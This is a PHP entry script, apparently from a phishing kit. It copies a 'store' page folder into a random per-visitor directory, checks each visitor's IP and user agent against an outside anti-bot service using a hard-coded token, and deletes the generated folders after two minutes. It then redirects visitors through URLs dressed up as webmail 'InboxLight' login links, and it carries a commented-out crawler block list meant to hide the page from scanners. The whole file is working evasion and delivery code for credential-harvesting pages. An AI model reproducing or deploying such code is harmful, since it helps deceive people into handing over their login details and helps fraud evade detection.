<?php

session_start();

include 'delete_function.php';
//include 'includes/config.php';
//include 'includes/user_details.php';
//function isBotDetected()
//{
//    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
//    if (preg_match('/abacho|accona|AddThis|AdsBot|ahoy|AhrefsBot|AISearchBot|alexa|altavista|anthill|appie|applebot|arale|araneo|AraybOt|ariadne|arks|aspseek|ATN_Worldwide|Atomz|baiduspider|baidu|bbot|bingbot|bing|Bjaaland|BlackWidow|BotLink|bot|boxseabot|bspider|calif|CCBot|ChinaClaw|christcrawler|CMC\/0\.01|combine|confuzzledbot|contaxe|CoolBot|cosmos|crawler|crawlpaper|crawl|curl|cusco|cyberspyder|cydralspider|dataprovider|digger|DIIbot|DotBot|downloadexpress|DragonBot|DuckDuckBot|dwcp|EasouSpider|ebiness|ecollector|elfinbot|esculapio|ESI|esther|eStyle|Ezooms|facebookexternalhit|facebook|facebot|fastcrawler|FatBot|FDSE|FELIX IDE|fetch|fido|find|Firefly|fouineur|Freecrawl|froogle|gammaSpider|gazz|gcreep|geona|Getterrobo-Plus|get|girafabot|golem|googlebot|\-google|grabber|GrabNet|griffon|Gromit|gulliver|gulper|hambot|havIndex|hotwired|htdig|HTTrack|ia_archiver|iajabot|IDBot|Informant|InfoSeek|InfoSpiders|INGRID\/0\.1|inktomi|inspectorwww|Internet Cruiser Robot|irobot|Iron33|JBot|jcrawler|Jeeves|jobo|KDD\-Explorer|KIT\-Fireball|ko_yappo_robot|label\-grabber|larbin|legs|libwww-perl|linkedin|Linkidator|linkwalker|Lockon|logo_gif_crawler|Lycos|m2e|majesticsEO|marvin|mattie|mediafox|mediapartners|MerzScope|MindCrawler|MJ12bot|mod_pagespeed|moget|Motor|msnbot|muncher|muninn|MuscatFerret|MwdSearch|NationalDirectory|naverbot|NEC\-MeshExplorer|NetcraftSurveyAgent|NetScoop|NetSeer|newscan\-online|nil|none|Nutch|ObjectsSearch|Occam|openstat.ru\/Bot|packrat|pageboy|ParaSite|patric|pegasus|perlcrawler|phpdig|piltdownman|Pimptrain|pingdom|pinterest|pjspider|PlumtreeWebAccessor|PortalBSpider|psbot|rambler|Raven|RHCS|RixBot|roadrunner|Robbie|robi|RoboCrawl|robofox|Scooter|Scrubby|Search\-AU|searchprocess|search|SemrushBot|Senrigan|seznambot|Shagseeker|sharp\-info\-agent|sift|SimBot|Site Valet|SiteSucker|skymob|SLCrawler\/2\.0|slurp|snooper|solbot|speedy|spider_monkey|SpiderBot\/1\.0|spiderline|spider|suke|tach_bw|TechBOT|TechnoratiSnoop|templeton|teoma|titin|topiclink|twitterbot|twitter|UdmSearch|Ukonline|UnwindFetchor|URL_Spider_SQL|urlck|urlresolver|Valkyrie libwww\-perl|verticrawl|Victoria|void\-bot|Voyager|VWbot_K|wapspider|WebBandit\/1\.0|webcatcher|WebCopier|WebFindBot|WebLeacher|WebMechanic|WebMoose|webquest|webreaper|webspider|webs|WebWalker|WebZip|wget|whowhere|winona|wlm|WOLP|woriobot|WWWC|XGET|xing|yahoo|YandexBot|YandexMobileBot|yandex|yeti|Zeus/i', $userAgent)) {
//        return true;
//    }
//
//    return false;
//
//}

//if (isBotDetected()) {
//    exit(0);
//}

//if ($show_captcha == "yes" && !isset($_GET["captcha_done"])) {
//    header('location:captcha/index.php');
//    exit;
//}
//+++++++++++++++++// VARIABLES DECLARATION \\+++++++++++++++++\\
$src = "store";
$date_time = date("d-m-Yh-i-sa");
$random = getName(18);
checking();
$b = base64_encode($random);

$result = hash("sha256", rand());

$random = md5($date_time.getName(16));
// SET UNIQUE USER SESSION
$_SESSION["user_id"] = $random;


function getName($n)
{
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';

    for ($i = 0; $i < $n; $i++) {
        $index = rand(0, strlen($characters) - 1);
        $randomString .= $characters[$index];
    }

    return $randomString;
}

function checking(){
    $user_agent = $_SERVER["HTTP_USER_AGENT"];
    $client_ip=get_client_ip();
    $url="http://antibotspanel.com/web/antibot-manage/validity?ip=".$client_ip."&ua=".$user_agent."&token=a597e50502f5ff68e3e25b9114205d4a";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, TRUE);
    curl_setopt($ch, CURLOPT_NOBODY, TRUE); // remove body
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $head = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);


}


function get_client_ip()
{
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $_SERVER["REMOTE_ADDR"] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        $_SERVER["HTTP_CLIENT_IP"] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client = @$_SERVER["HTTP_CLIENT_IP"];
    $forward = @$_SERVER["HTTP_X_FORWARDED_FOR"];
    $remote = $_SERVER["REMOTE_ADDR"];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}




//+++++++++++++++++// VARIABLES DECLARATION END \\+++++++++++++++++\\ 


// is ko change karna mad or pathan ko. Link Work like: index.php?premium=346532

//if ($_GET['xujytrhamtion'] != "456rgrfds427") {
//    exit;
//}


$now = time();
// 
if ($handle = opendir($path)) // bhai yahan full directory deni hai jisy scan kry
{

    $blacklist = array('.', '..', 'delete_function.php', 'js', 'includes', 'index.php', 'captcha', '.htaccess', 'store', 'any other file?');
    // caution: bhai . or .. remove ni krna $blacklist array sy. warna pichly folders k L lg jain gy.
    while (false !== ($file = readdir($handle))) {
        if (!in_array($file, $blacklist)) {

            if ($now - filemtime($file) >= 120) // 120 second. (use 60 * 60 for 1 hours)
            {

                if (is_dir($file)) {
                    deletefolder($file);
                }
            }

        }
    }
    closedir($handle);

}


//+++++++++++++++++// CREATE FOLDER AND COPY FILE \\+++++++++++++++++\\

function recurse_copy($src, $dst)
{
    $dir = opendir($src);
    @mkdir($dst);
    while (false !== ($file = readdir($dir))) {
        if (($file != '.') && ($file != '..')) {
            if (is_dir($src . '/' . $file)) {
                recurse_copy($src . '/' . $file, $dst . '/' . $file);
            } else {
                copy($src . '/' . $file, $dst . '/' . $file);
            }
        }
    }
    closedir($dir);
}


//+++++++++++++++++// CALL FUNCTION \\+++++++++++++++++\\

recurse_copy($src, $random);


// REDIRECT TO NEW FOLDER FILES
//header("location:".$random."?Key=".$random."&rand=13InboxLightaspxn_".$random."_$b-&$result");


?>

<script type="text/javascript">

    var random = '<?php echo $random;?>';
    var b = '<?php echo $b;?>';
    var result = '<?php echo $result;?>';
    var url = "";

    var hashValue = location.hash.substr(1);
    if (hashValue == "") {
        var queryString = window.location.search;
        var urlParams = new URLSearchParams(queryString);
        var userid = urlParams.get('userid');

        if (userid != "" && userid != null) {
            url = random + "?Key=" + random + "&rand=16lnboxLightespn_" + random + "_" + b + "-&" + result + "&userid=" + userid;
            window.location.href = url;
        } else {
            url = random + "?Key=" + random + "&rand=19lnboxLightespn_" + random + "_" + b + "-&" + result;
            window.location.href = url;
        }

    } else {
        url = random + "?Key=" + random + "&rand=16lnboxLightespn_" + random + "_" + b + "-&" + result + "#" + hashValue;
        window.location.href = url;
    }

</script>